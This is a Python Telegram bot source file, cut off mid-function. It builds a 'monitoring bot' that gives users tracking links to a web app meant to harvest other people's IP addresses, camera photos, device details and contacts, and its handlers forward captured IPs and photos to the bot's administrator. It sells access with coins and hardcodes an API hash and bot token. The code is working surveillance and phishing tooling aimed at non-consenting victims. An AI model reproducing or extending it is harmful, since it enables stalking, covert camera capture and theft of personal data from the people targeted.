import asyncio
import json
import sqlite3
import random
import string
import time
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError

# ===== تنظیمات =====
API_ID = 36154125
API_HASH = '57d6a2aeb14f8afc6fdf2d1ae08fb1a3'
BOT_TOKEN = '8966797328:AAFoBoh2-h1ivo7E-eUWCEXrQV6pmYmN1CQ'
ADMIN_ID = 7575502917

# ===== لینک WebApp جدید شما (نتلیفای) =====
WEB_APP_URL = 'https://idyllic-jelly-dceebe.netlify.app/'

# ===== کانال‌های عضویت اجباری =====
REQUIRED_CHANNELS = ['@FARSHAD_CHINAL', '@noori_team_810']

# ===== دیتابیس =====
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            language TEXT,
            coins INTEGER DEFAULT 5,
            invite_code TEXT,
            invited_by INTEGER,
            registered_at TIMESTAMP,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TIMESTAMP,
            is_used INTEGER DEFAULT 0
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS support_tickets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            message TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY
        )
    ''')
    # اضافه کردن ادمین اصلی
    c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (ADMIN_ID,))
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name, language='fa'):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    invite_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    c.execute('''
        INSERT OR IGNORE INTO users (user_id, username, first_name, language, invite_code, registered_at, coins)
        VALUES (?, ?, ?, ?, ?, ?, 5)
    ''', (user_id, username, first_name, language, invite_code, datetime.now()))
    conn.commit()
    conn.close()

def update_user_language(user_id, language):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('UPDATE users SET language = ? WHERE user_id = ?', (language, user_id))
    conn.commit()
    conn.close()

def add_coins(user_id, amount):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('UPDATE users SET coins = coins + ? WHERE user_id = ?', (amount, user_id))
    conn.commit()
    conn.close()

def get_coins(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT coins FROM users WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def use_coins(user_id, amount):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT coins FROM users WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    if result and result[0] >= amount:
        c.execute('UPDATE users SET coins = coins - ? WHERE user_id = ?', (amount, user_id))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def save_invite_code(owner_id, code):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('INSERT INTO invites (code, owner_id, is_used) VALUES (?, ?, 0)', (code, owner_id))
    conn.commit()
    conn.close()

def use_invite_code(code, user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT owner_id FROM invites WHERE code = ? AND is_used = 0', (code,))
    result = c.fetchone()
    if result:
        owner_id = result[0]
        c.execute('UPDATE invites SET is_used = 1, used_by = ?, used_at = ? WHERE code = ?', 
                  (user_id, datetime.now(), code))
        add_coins(owner_id, 1)
        add_coins(user_id, 2)
        conn.commit()
        conn.close()
        return owner_id
    conn.close()
    return None

def is_admin(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT 1 FROM admins WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def add_admin(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT user_id, first_name, username, coins FROM users')
    result = c.fetchall()
    conn.close()
    return result

# ===== زبان‌ها =====
LANGUAGES = {
    'Da': {
        'name': 'دری 🇦🇫',
        'welcome': 'سلام 👋\nبه ربات نظارت خوش آمدید!\nلطفاً زبان خود را انتخاب کنید:',
        'lang_selected': '✅ زبان شما به {lang} تنظیم شد.',
        'force_join': 'برای استفاده از ربات، ابتدا باید در کانال‌های زیر عضو شوید:\n\n{channels}\n\nپس از عضویت، روی دکمه زیر کلیک کنید.',
        'checked': '✅ عضویت شما تأیید شد!',
        'not_member': '❌ شما هنوز در کانال‌ها عضو نشده‌اید. لطفاً ابتدا عضو شوید.',
        'main_menu': 'به بخش نظارت دستگاه خوش آمدید ✅\n\nگزینه مورد نظر خود را انتخاب کنید ❗',
        'ip': '📡 دریافت آی‌پی',
        'camera': '📸 دسترسی به دوربین',
        'device': '📱 اطلاعات دستگاه',
        'contacts': '👥 دسترسی به مخاطبین',
        'whatsapp': '💬 دسترسی به واتساپ',
        'support': '🛠 پشتیبانی',
        'back': '🔙 بازگشت',
        'coins': '🪙 سکه‌ها',
        'seller': '💎 سازنده',
        'ip_link': 'سلام این لینک شماست 👇🏼❗\n{link}\n\nهر گونه استفاده از ربات به دوست خودتان میباشد ❗😊',
        'camera_link': 'سلام این لینک شماست 👇🏼❗\n{link}\n\nهر گونه استفاده از ربات به دوست خودتان میباشد ❗😊',
        'device_link': 'سلام این لینک شماست 👇🏼❗\n{link}\n\nهر گونه استفاده از ربات به دوست خودتان میباشد ❗😊',
        'contacts_link': 'سلام این لینک شماست 👇🏼❗\n{link}\n\nهر گونه استفاده از ربات به دوست خودتان میباشد ❗😊',
        'no_coins': '❌ موجودی شما کم است!\n\nسکه فعلی شما: {coins}\nتعداد سکه نیاز دارید: {needed}\n\nبرای دریافت سکه رایگان از لینک زیر استفاده کنید ❗\n{invite_link}\n\nبرای خرید سکه با قیمت مناسب با سازنده در ارتباط شوید.',
        'support_msg': 'متن که می‌خواهید برای پشتیبانی ارسال کنید را بفرستید:',
        'support_sent': '✅ پیام شما به پشتیبانی ارسال شد. به زودی پاسخ داده می‌شود.',
        'admin_reply': '📩 پاسخ از ادمین:\n\n{msg}',
        'invite_success': '✅ کاربر {name} با لینک شما وارد ربات شد و 1 سکه به شما اضافه شد!',
        'already_used': '❌ این لینک قبلاً استفاده شده است.',
        'invalid_code': '❌ کد دعوت نامعتبر است.',
        'whatsapp_building': '🚧 این گزینه در حال ساخت است.',
        'send_lang_cmd': 'برای تغییر زبان، دستور /LANGUAGE را بفرستید.',
        'lang_changed': '✅ زبان شما به {lang} تغییر کرد.',
        'support_reply': '✅ پاسخ شما به کاربر ارسال شد.',
        'coins_insufficient': '❌ موجودی شما کافی نیست!',
        'admin_panel': '🔐 پنل ادمین:\n\n1️⃣ ارسال همگانی\n2️⃣ افزودن ادمین\n3️⃣ ارسال سکه\n4️⃣ آمار ربات\n5️⃣ خروج'
    },
    'en': {
        'name': 'English 🇬🇧',
        'welcome': 'Hello 👋\nWelcome to Monitoring Bot!\nPlease select your language:',
        'lang_selected': '✅ Your language set to {lang}.',
        'force_join': 'To use this bot, you must join the following channels:\n\n{channels}\n\nAfter joining, click the button below.',
        'checked': '✅ Your membership confirmed!',
        'not_member': '❌ You are not a member of the channels yet. Please join first.',
        'main_menu': 'Welcome to Device Monitoring ✅\n\nSelect an option below ❗',
        'ip': '📡 Get IP',
        'camera': '📸 Camera Access',
        'device': '📱 Device Info',
        'contacts': '👥 Contacts Access',
        'whatsapp': '💬 WhatsApp Access',
        'support': '🛠 Support',
        'back': '🔙 Back',
        'coins': '🪙 Coins',
        'seller': '💎 Seller',
        'ip_link': 'Hello, this is your link 👇🏼❗\n{link}\n\nAny use of the bot is your friend\'s responsibility ❗😊',
        'camera_link': 'Hello, this is your link 👇🏼❗\n{link}\n\nAny use of the bot is your friend\'s responsibility ❗😊',
        'device_link': 'Hello, this is your link 👇🏼❗\n{link}\n\nAny use of the bot is your friend\'s responsibility ❗😊',
        'contacts_link': 'Hello, this is your link 👇🏼❗\n{link}\n\nAny use of the bot is your friend\'s responsibility ❗😊',
        'no_coins': '❌ Your balance is low!\n\nYour current coins: {coins}\nCoins needed: {needed}\n\nUse the link below for free coins ❗\n{invite_link}\n\nContact the seller for purchasing coins.',
        'support_msg': 'Please send your support message:',
        'support_sent': '✅ Your message sent to support. You will get reply soon.',
        'admin_reply': '📩 Reply from admin:\n\n{msg}',
        'invite_success': '✅ User {name} joined with your link! +1 coin added!',
        'already_used': '❌ This link has already been used.',
        'invalid_code': '❌ Invalid invite code.',
        'whatsapp_building': '🚧 This feature is under construction.',
        'send_lang_cmd': 'To change language, send /LANGUAGE',
        'lang_changed': '✅ Your language changed to {lang}.',
        'support_reply': '✅ Your reply sent to user.',
        'coins_insufficient': '❌ Insufficient coins!',
        'admin_panel': '🔐 Admin Panel:\n\n1️⃣ Broadcast\n2️⃣ Add Admin\n3️⃣ Send Coins\n4️⃣ Stats\n5️⃣ Exit'
    },
    'de': {
        'name': 'Deutsch 🇩🇪',
        'welcome': 'Hallo 👋\nWillkommen beim Überwachungsbot!\nBitte wählen Sie Ihre Sprache:',
        'lang_selected': '✅ Ihre Sprache wurde auf {lang} eingestellt.',
        'force_join': 'Um diesen Bot zu nutzen, müssen Sie folgenden Kanälen beitreten:\n\n{channels}\n\nKlicken Sie nach dem Beitritt auf die Schaltfläche unten.',
        'checked': '✅ Ihre Mitgliedschaft wurde bestätigt!',
        'not_member': '❌ Sie sind noch kein Mitglied der Kanäle. Bitte treten Sie zuerst bei.',
        'main_menu': 'Willkommen bei der Geräteüberwachung ✅\n\nWählen Sie unten eine Option aus ❗',
        'ip': '📡 IP abrufen',
        'camera': '📸 Kamerazugriff',
        'device': '📱 Geräteinformationen',
        'contacts': '👥 Kontaktzugriff',
        'whatsapp': '💬 WhatsApp-Zugriff',
        'support': '🛠 Support',
        'back': '🔙 Zurück',
        'coins': '🪙 Münzen',
        'seller': '💎 Verkäufer',
        'ip_link': 'Hallo, hier ist Ihr Link 👇🏼❗\n{link}\n\nDie Nutzung des Bots erfolgt auf eigene Verantwortung ❗😊',
        'camera_link': 'Hallo, hier ist Ihr Link 👇🏼❗\n{link}\n\nDie Nutzung des Bots erfolgt auf eigene Verantwortung ❗😊',
        'device_link': 'Hallo, hier ist Ihr Link 👇🏼❗\n{link}\n\nDie Nutzung des Bots erfolgt auf eigene Verantwortung ❗😊',
        'contacts_link': 'Hallo, hier ist Ihr Link 👇🏼❗\n{link}\n\nDie Nutzung des Bots erfolgt auf eigene Verantwortung ❗😊',
        'no_coins': '❌ Ihr Guthaben ist niedrig!\n\nIhre aktuellen Münzen: {coins}\nBenötigte Münzen: {needed}\n\nVerwenden Sie den Link unten für kostenlose Münzen ❗\n{invite_link}\n\nKontaktieren Sie den Verkäufer für den Kauf von Münzen.',
        'support_msg': 'Bitte senden Sie Ihre Support-Nachricht:',
        'support_sent': '✅ Ihre Nachricht wurde an den Support gesendet. Sie erhalten bald eine Antwort.',
        'admin_reply': '📩 Antwort vom Admin:\n\n{msg}',
        'invite_success': '✅ Benutzer {name} ist mit Ihrem Link beigetreten! +1 Münze hinzugefügt!',
        'already_used': '❌ Dieser Link wurde bereits verwendet.',
        'invalid_code': '❌ Ungültiger Einladungscode.',
        'whatsapp_building': '🚧 Diese Funktion befindet sich im Aufbau.',
        'send_lang_cmd': 'Zum Ändern der Sprache senden Sie /LANGUAGE',
        'lang_changed': '✅ Ihre Sprache wurde auf {lang} geändert.',
        'support_reply': '✅ Ihre Antwort wurde an den Benutzer gesendet.',
        'coins_insufficient': '❌ Nicht genügend Münzen!',
        'admin_panel': '🔐 Admin-Bereich:\n\n1️⃣ Rundsendung\n2️⃣ Admin hinzufügen\n3️⃣ Münzen senden\n4️⃣ Statistik\n5️⃣ Beenden'
    },
    'ar': {
        'name': 'العربية 🇸🇦',
        'welcome': 'مرحباً 👋\nأهلاً بك في بوت المراقبة!\nيرجى اختيار لغتك:',
        'lang_selected': '✅ تم تعيين لغتك إلى {lang}.',
        'force_join': 'لاستخدام هذا البوت، يجب عليك الانضمام إلى القنوات التالية:\n\n{channels}\n\nبعد الانضمام، انقر على الزر أدناه.',
        'checked': '✅ تم تأكيد عضويتك!',
        'not_member': '❌ لم تنضم بعد إلى القنوات. يرجى الانضمام أولاً.',
        'main_menu': 'مرحباً بك في مراقبة الجهاز ✅\n\nاختر خياراً أدناه ❗',
        'ip': '📡 الحصول على IP',
        'camera': '📸 الوصول إلى الكاميرا',
        'device': '📱 معلومات الجهاز',
        'contacts': '👥 الوصول إلى جهات الاتصال',
        'whatsapp': '💬 الوصول إلى واتساب',
        'support': '🛠 الدعم',
        'back': '🔙 رجوع',
        'coins': '🪙 العملات',
        'seller': '💎 البائع',
        'ip_link': 'مرحباً، هذا هو رابطك 👇🏼❗\n{link}\n\nأي استخدام للبوت مسؤولية صديقك ❗😊',
        'camera_link': 'مرحباً، هذا هو رابطك 👇🏼❗\n{link}\n\nأي استخدام للبوت مسؤولية صديقك ❗😊',
        'device_link': 'مرحباً، هذا هو رابطك 👇🏼❗\n{link}\n\nأي استخدام للبوت مسؤولية صديقك ❗😊',
        'contacts_link': 'مرحباً، هذا هو رابطك 👇🏼❗\n{link}\n\nأي استخدام للبوت مسؤولية صديقك ❗😊',
        'no_coins': '❌ رصيدك منخفض!\n\nعملاتك الحالية: {coins}\nالعملات المطلوبة: {needed}\n\nاستخدم الرابط أدناه للحصول على عملات مجانية ❗\n{invite_link}\n\nاتصل بالبائع لشراء العملات.',
        'support_msg': 'يرجى إرسال رسالة الدعم الخاصة بك:',
        'support_sent': '✅ تم إرسال رسالتك إلى الدعم. ستتلقى رداً قريباً.',
        'admin_reply': '📩 رد من المسؤول:\n\n{msg}',
        'invite_success': '✅ المستخدم {name} انضم عبر رابطك! تم إضافة 1 عملة!',
        'already_used': '❌ تم استخدام هذا الرابط بالفعل.',
        'invalid_code': '❌ رمز الدعوة غير صالح.',
        'whatsapp_building': '🚧 هذه الميزة قيد الإنشاء.',
        'send_lang_cmd': 'لتغيير اللغة، أرسل /LANGUAGE',
        'lang_changed': '✅ تم تغيير لغتك إلى {lang}.',
        'support_reply': '✅ تم إرسال ردك إلى المستخدم.',
        'coins_insufficient': '❌ العملات غير كافية!',
        'admin_panel': '🔐 لوحة المسؤول:\n\n1️⃣ بث عام\n2️⃣ إضافة مسؤول\n3️⃣ إرسال عملات\n4️⃣ إحصائيات\n5️⃣ خروج'
    },
    'uz': {
        'name': 'Oʻzbekcha 🇺🇿',
        'welcome': 'Salom 👋\nMonitoring botiga xush kelibsiz!\nIltimos, tilingizni tanlang:',
        'lang_selected': '✅ Tilingiz {lang} ga o‘rnatildi.',
        'force_join': 'Botdan foydalanish uchun quyidagi kanallarga aʼzo boʻlishingiz kerak:\n\n{channels}\n\nAʼzo boʻlgandan so‘ng, quyidagi tugmani bosing.',
        'checked': '✅ Aʼzoligingiz tasdiqlandi!',
        'not_member': '❌ Siz hali kanallarga aʼzo emassiz. Iltimos, avval aʼzo bo‘ling.',
        'main_menu': 'Qurilmani kuzatishga xush kelibsiz ✅\n\nQuyidagi variantlardan birini tanlang ❗',
        'ip': '📡 IP olish',
        'camera': '📸 Kameraga kirish',
        'device': '📱 Qurilma maʼlumotlari',
        'contacts': '👥 Kontaktlarga kirish',
        'whatsapp': '💬 WhatsApp-ga kirish',
        'support': '🛠 Yordam',
        'back': '🔙 Orqaga',
        'coins': '🪙 Tangalar',
        'seller': '💎 Sotuvchi',
        'ip_link': 'Salom, bu sizning linkingiz 👇🏼❗\n{link}\n\nBotdan har qanday foydalanish do‘stingiz zimmasida ❗😊',
        'camera_link': 'Salom, bu sizning linkingiz 👇🏼❗\n{link}\n\nBotdan har qanday foydalanish do‘stingiz zimmasida ❗😊',
        'device_link': 'Salom, bu sizning linkingiz 👇🏼❗\n{link}\n\nBotdan har qanday foydalanish do‘stingiz zimmasida ❗😊',
        'contacts_link': 'Salom, bu sizning linkingiz 👇🏼❗\n{link}\n\nBotdan har qanday foydalanish do‘stingiz zimmasida ❗😊',
        'no_coins': '❌ Balansingiz past!\n\nJoriy tangalaringiz: {coins}\nKerakli tangalar: {needed}\n\nBepul tangalar olish uchun quyidagi havoladan foydalaning ❗\n{invite_link}\n\nTangalarni sotib olish uchun sotuvchi bilan bog‘laning.',
        'support_msg': 'Iltimos, yordam xabaringizni yuboring:',
        'support_sent': '✅ Xabaringiz yordamga yuborildi. Tez orada javob olasiz.',
        'admin_reply': '📩 Administratordan javob:\n\n{msg}',
        'invite_success': '✅ Foydalanuvchi {name} sizning linkingiz orqali qo‘shildi! +1 tanga qo‘shildi!',
        'already_used': '❌ Bu havola allaqachon ishlatilgan.',
        'invalid_code': '❌ Yaroqsiz taklif kodi.',
        'whatsapp_building': '🚧 Bu funksiya hozirda ishlab chiqilmoqda.',
        'send_lang_cmd': 'Tilni o‘zgartirish uchun /LANGUAGE yuboring',
        'lang_changed': '✅ Tilingiz {lang} ga o‘zgartirildi.',
        'support_reply': '✅ Javobingiz foydalanuvchiga yuborildi.',
        'coins_insufficient': '❌ Tangalar yetarli emas!',
        'admin_panel': '🔐 Admin panel:\n\n1️⃣ Umumiy xabar\n2️⃣ Admin qo‘shish\n3️⃣ Tanga yuborish\n4️⃣ Statistika\n5️⃣ Chiqish'
    },
    'ur': {
        'name': 'اردو 🇵🇰',
        'welcome': 'السلام علیکم 👋\nمانیٹرنگ بوٹ میں خوش آمدید!\nبراہ کرم اپنی زبان منتخب کریں:',
        'lang_selected': '✅ آپ کی زبان {lang} پر سیٹ کر دی گئی۔',
        'force_join': 'بوٹ استعمال کرنے کے لیے آپ کو درج ذیل چینلز کو جوائن کرنا ہوگا:\n\n{channels}\n\nجوائن کرنے کے بعد نیچے دیے گئے بٹن پر کلک کریں۔',
        'checked': '✅ آپ کی رکنیت کی تصدیق ہوگئی!',
        'not_member': '❌ آپ ابھی تک چینلز کے رکن نہیں ہیں۔ براہ کرم پہلے جوائن کریں۔',
        'main_menu': 'ڈیوائس مانیٹرنگ میں خوش آمدید ✅\n\nبراہ کرم کوئی آپشن منتخب کریں ❗',
        'ip': '📡 آئی پی حاصل کریں',
        'camera': '📸 کیمرہ تک رسائی',
        'device': '📱 ڈیوائس کی معلومات',
        'contacts': '👥 رابطوں تک رسائی',
        'whatsapp': '💬 واٹس ایپ تک رسائی',
        'support': '🛠 سپورٹ',
        'back': '🔙 واپس',
        'coins': '🪙 سکے',
        'seller': '💎 بیچنے والا',
        'ip_link': 'سلام، یہ آپ کا لنک ہے 👇🏼❗\n{link}\n\nبوٹ کا کوئی بھی استعمال آپ کے دوست کی ذمہ داری ہے ❗😊',
        'camera_link': 'سلام، یہ آپ کا لنک ہے 👇🏼❗\n{link}\n\nبوٹ کا کوئی بھی استعمال آپ کے دوست کی ذمہ داری ہے ❗😊',
        'device_link': 'سلام، یہ آپ کا لنک ہے 👇🏼❗\n{link}\n\nبوٹ کا کوئی بھی استعمال آپ کے دوست کی ذمہ داری ہے ❗😊',
        'contacts_link': 'سلام، یہ آپ کا لنک ہے 👇🏼❗\n{link}\n\nبوٹ کا کوئی بھی استعمال آپ کے دوست کی ذمہ داری ہے ❗😊',
        'no_coins': '❌ آپ کا بیلنس کم ہے!\n\nآپ کے موجودہ سکے: {coins}\nمطلوبہ سکے: {needed}\n\nمفت سکے حاصل کرنے کے لیے نیچے دیے گئے لنک کا استعمال کریں ❗\n{invite_link}\n\nسکے خریدنے کے لیے بیچنے والے سے رابطہ کریں۔',
        'support_msg': 'براہ کرم اپنا سپورٹ پیغام بھیجیں:',
        'support_sent': '✅ آپ کا پیغام سپورٹ کو بھیج دیا گیا۔ جلد ہی جواب دیا جائے گا۔',
        'admin_reply': '📩 ایڈمن کا جواب:\n\n{msg}',
        'invite_success': '✅ صارف {name} آپ کے لنک کے ذریعے شامل ہوا! 1 سکہ شامل کر دیا گیا!',
        'already_used': '❌ یہ لنک پہلے ہی استعمال ہو چکا ہے۔',
        'invalid_code': '❌ غلط انوائٹ کوڈ۔',
        'whatsapp_building': '🚧 یہ فیچر زیر تعمیر ہے۔',
        'send_lang_cmd': 'زبان تبدیل کرنے کے لیے /LANGUAGE بھیجیں',
        'lang_changed': '✅ آپ کی زبان {lang} میں تبدیل کر دی گئی۔',
        'support_reply': '✅ آپ کا جواب صارف کو بھیج دیا گیا۔',
        'coins_insufficient': '❌ سکے ناکافی ہیں!',
        'admin_panel': '🔐 ایڈمن پینل:\n\n1️⃣ براڈکاسٹ\n2️⃣ ایڈمن شامل کریں\n3️⃣ سکے بھیجیں\n4️⃣ شماریات\n5️⃣ باہر جائیں'
    }
}

# ===== کلاس ربات =====
class MonitoringBot:
    def __init__(self):
        self.bot = TelegramClient('monitoring_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
        self.user_languages = {}
        self.user_states = {}
        self.admin_states = {}
        self.temp_data = {}
        init_db()

    def get_lang(self, user_id):
        user = get_user(user_id)
        if user:
            return user[3]  # زبان در ستون 4
        return 'fa'

    def get_text(self, user_id, key, **kwargs):
        lang_code = self.get_lang(user_id)
        lang_data = LANGUAGES.get(lang_code, LANGUAGES['fa'])
        text = lang_data.get(key, key)
        if kwargs:
            try:
                text = text.format(**kwargs)
            except:
                pass
        return text

    async def check_membership(self, user_id):
        for channel in REQUIRED_CHANNELS:
            try:
                entity = await self.bot.get_entity(channel)
                participant = await self.bot.get_participants(entity, filter=user_id)
                if not participant:
                    return False
            except:
                return False
        return True

    async def start_handler(self, event):
        user_id = event.sender_id
        user = get_user(user_id)
        
        if not user:
            create_user(user_id, event.sender.username, event.sender.first_name)
            
            # دکمه‌های انتخاب زبان
            buttons = []
            for code, lang in LANGUAGES.items():
                buttons.append([Button.inline(lang['name'], f"lang_{code}")])
            
            await event.respond(
                self.get_text(user_id, 'welcome'),
                buttons=buttons
            )
            return
        
        # بررسی عضویت
        if not await self.check_membership(user_id):
            channels_list = '\n'.join(REQUIRED_CHANNELS)
            await event.respond(
                self.get_text(user_id, 'force_join', channels=channels_list),
                buttons=[[Button.inline("✅ عضو شدم", "check_membership")]]
            )
            return
        
        # نمایش منوی اصلی
        await self.show_main_menu(event, user_id)

    async def show_main_menu(self, event, user_id):
        text = self.get_text(user_id, 'main_menu')
        buttons = [
            [Button.inline(self.get_text(user_id, 'ip'), "ip")],
            [Button.inline(self.get_text(user_id, 'camera'), "camera")],
            [Button.inline(self.get_text(user_id, 'device'), "device")],
            [Button.inline(self.get_text(user_id, 'contacts'), "contacts")],
            [Button.inline(self.get_text(user_id, 'whatsapp'), "whatsapp")],
            [Button.inline(self.get_text(user_id, 'support'), "support")],
            [Button.inline(self.get_text(user_id, 'coins'), "coins")],
            [Button.inline(self.get_text(user_id, 'seller'), "seller")]
        ]
        await event.respond(text, buttons=buttons)

    async def handle_callback(self, event):
        user_id = event.sender_id
        data = event.data.decode()
        
        # انتخاب زبان
        if data.startswith('lang_'):
            lang_code = data.split('_')[1]
            update_user_language(user_id, lang_code)
            await event.answer(self.get_text(user_id, 'lang_selected', lang=lang_code))
            
            # بررسی عضویت
            if not await self.check_membership(user_id):
                channels_list = '\n'.join(REQUIRED_CHANNELS)
                await event.edit(
                    self.get_text(user_id, 'force_join', channels=channels_list),
                    buttons=[[Button.inline("✅ عضو شدم", "check_membership")]]
                )
            else:
                await self.show_main_menu(event, user_id)
            return
        
        # بررسی عضویت
        if data == 'check_membership':
            if await self.check_membership(user_id):
                await event.answer(self.get_text(user_id, 'checked'))
                await self.show_main_menu(event, user_id)
            else:
                await event.answer(self.get_text(user_id, 'not_member'), alert=True)
            return
        
        # منوی اصلی
        if data == 'back_to_main':
            await self.show_main_menu(event, user_id)
            return
        
        # ===== گزینه‌های منو =====
        user = get_user(user_id)
        coins = user[4] if user else 0
        
        # دریافت آی‌پی (رایگان)
        if data == 'ip':
            link = f"{WEB_APP_URL}?action=ip&user_id={user_id}"
            await event.edit(self.get_text(user_id, 'ip_link', link=link))
            await asyncio.sleep(2)
            await self.show_main_menu(event, user_id)
            return
        
        # دسترسی به دوربین (رایگان)
        if data == 'camera':
            link = f"{WEB_APP_URL}?action=camera&user_id={user_id}"
            await event.edit(self.get_text(user_id, 'camera_link', link=link))
            await asyncio.sleep(2)
            await self.show_main_menu(event, user_id)
            return
        
        # اطلاعات دستگاه (رایگان)
        if data == 'device':
            link = f"{WEB_APP_URL}?action=device&user_id={user_id}"
            await event.edit(self.get_text(user_id, 'device_link', link=link))
            await asyncio.sleep(2)
            await self.show_main_menu(event, user_id)
            return
        
        # دسترسی به مخاطبین (نیاز به 30 سکه)
        if data == 'contacts':
            if coins >= 30:
                link = f"{WEB_APP_URL}?action=contacts&user_id={user_id}"
                use_coins(user_id, 30)
                await event.edit(self.get_text(user_id, 'contacts_link', link=link))
                await asyncio.sleep(2)
                await self.show_main_menu(event, user_id)
            else:
                invite_link = f"https://t.me/{self.bot.me.username}?start={user[5] if user else ''}"
                await event.edit(
                    self.get_text(user_id, 'no_coins', 
                                  coins=coins, needed=30, invite_link=invite_link),
                    buttons=[
                        [Button.inline(self.get_text(user_id, 'seller'), "seller")],
                        [Button.inline(self.get_text(user_id, 'back'), "back_to_main")]
                    ]
                )
            return
        
        # دسترسی به واتساپ (نیاز به 100 سکه)
        if data == 'whatsapp':
            if coins >= 100:
                await event.edit(self.get_text(user_id, 'whatsapp_building'))
                await asyncio.sleep(2)
                await self.show_main_menu(event, user_id)
            else:
                invite_link = f"https://t.me/{self.bot.me.username}?start={user[5] if user else ''}"
                await event.edit(
                    self.get_text(user_id, 'no_coins', 
                                  coins=coins, needed=100, invite_link=invite_link),
                    buttons=[
                        [Button.inline(self.get_text(user_id, 'seller'), "seller")],
                        [Button.inline(self.get_text(user_id, 'back'), "back_to_main")]
                    ]
                )
            return
        
        # سکه‌ها
        if data == 'coins':
            await event.edit(
                f"🪙 {self.get_text(user_id, 'coins')}\n\n"
                f"💰 {self.get_text(user_id, 'coins')}: {coins}",
                buttons=[[Button.inline(self.get_text(user_id, 'back'), "back_to_main")]]
            )
            return
        
        # سازنده
        if data == 'seller':
            await event.edit(
                self.get_text(user_id, 'seller'),
                buttons=[[Button.inline(self.get_text(user_id, 'back'), "back_to_main")]]
            )
            # ارسال پیام به ادمین برای ارتباط
            await self.bot.send_message(ADMIN_ID, f"👤 کاربر {user_id} درخواست ارتباط با سازنده دارد.")
            return
        
        # پشتیبانی
        if data == 'support':
            await event.edit(
                self.get_text(user_id, 'support_msg'),
                buttons=[[Button.inline(self.get_text(user_id, 'back'), "back_to_main")]]
            )
            self.user_states[user_id] = 'waiting_support'
            return

    async def handle_message(self, event):
        user_id = event.sender_id
        text = event.raw_text
        
        # دستور تغییر زبان
        if text and text.upper() == '/LANGUAGE':
            buttons = []
            for code, lang in LANGUAGES.items():
                buttons.append([Button.inline(lang['name'], f"lang_{code}")])
            await event.respond(
                self.get_text(user_id, 'welcome'),
                buttons=buttons
            )
            return
        
        # دریافت پیام پشتیبانی
        if self.user_states.get(user_id) == 'waiting_support' and text:
            # ذخیره در دیتابیس
            conn = sqlite3.connect('users.db')
            c = conn.cursor()
            c.execute('''
                INSERT INTO support_tickets (user_id, message, created_at)
                VALUES (?, ?, ?)
            ''', (user_id, text, datetime.now()))
            conn.commit()
            conn.close()
            
            # ارسال به ادمین
            await self.bot.send_message(
                ADMIN_ID,
                f"🆕 پیام جدید از پشتیبانی:\n\n"
                f"👤 کاربر: {user_id}\n"
                f"📝 متن: {text}\n\n"
                f"برای پاسخ، روی این پیام ریپلی بزنید."
            )
            
            await event.respond(self.get_text(user_id, 'support_sent'))
            self.user_states[user_id] = None
            await self.show_main_menu(event, user_id)
            return
        
        # پاسخ ادمین به پشتیبانی
        if user_id == ADMIN_ID and event.is_reply:
            replied = await event.get_reply_message()
            if replied and 'پیام جدید از پشتیبانی' in replied.text:
                try:
                    # استخراج آیدی کاربر
                    lines = replied.text.split('\n')
                    for line in lines:
                        if '👤 کاربر:' in line:
                            target_id = int(line.split(':')[1].strip())
                            await self.bot.send_message(
                                target_id,
                                self.get_text(target_id, 'admin_reply', msg=text)
                            )
                            await event.respond(self.get_text(target_id, 'support_reply'))
                            break
                except Exception as e:
                    await event.respond(f"❌ خطا: {str(e)}")

    async def handle_webapp_data(self, event):
        user_id = event.sender_id
        data = event.message.web_app_data.data
        
        try:
            json_data = json.loads(data)
            action = json_data.get('action')
            
            if action == 'allow_gallery':
                # کاربر اجازه داد
                pass
            elif action == 'deny_gallery':
                # کاربر اجازه نداد
                pass
            elif json_data.get('type') == 'ip':
                # دریافت آی‌پی
                ip = json_data.get('data')
                await self.bot.send_message(ADMIN_ID, f"📡 آی‌پی کاربر {user_id}: {ip}")
                await event.respond(f"✅ آی‌پی شما: {ip}")
            elif json_data.get('type') == 'camera':
                # دریافت عکس از دوربین
                photo_data = json_data.get('data')
                await self.bot.send_message(ADMIN_ID, f"📸 عکس از دوربین کاربر {user_id}")
                # ارسال عکس به ادمین
                await self.bot.send_file(ADMIN_ID, photo_data)
                await event.respond("✅ عکس شما به ادمین ارسال شد.")
            elif json_data.get('type') == 'device_info':
